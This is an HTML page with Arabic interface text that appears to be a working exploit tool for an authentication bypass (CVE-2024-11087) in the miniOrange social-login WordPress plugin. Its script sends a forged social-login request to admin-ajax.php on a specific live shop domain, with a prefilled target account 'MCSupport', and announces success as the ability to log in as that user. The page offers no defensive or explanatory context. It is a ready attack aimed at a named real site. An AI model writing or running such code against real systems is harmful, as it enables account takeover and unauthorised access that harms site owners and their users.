<!DOCTYPE html>
<html>
<head>
    <title>miniOrange Exploit Test</title>
</head>
<body>
    <h1>اختبار ثغرة miniOrange CVE-2024-11087</h1>
    <p>أدخل اسم المستخدم المستهدف:</p>
    <input type="text" id="username" value="MCSupport">
    <button onclick="exploit()">اختبار</button>
    
    <pre id="result"></pre>
    
    <script>
        function exploit() {
            const username = document.getElementById('username').value;
            
            fetch('https://magic-city.shop/wp-admin/admin-ajax.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `action=mo_openid_social_login&social_app=google&username=${username}`,
                credentials: 'include'
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('result').innerText = data;
                if (data.includes('success') || data.includes('redirect')) {
                    document.getElementById('result').style.color = 'green';
                    document.getElementById('result').innerText += '\n\n✅ نجح! يمكنك الآن الدخول كـ ' + username;
                }
            })
            .catch(error => {
                document.getElementById('result').innerText = 'Error: ' + error;
            });
        }
    </script>
</body>
</html>
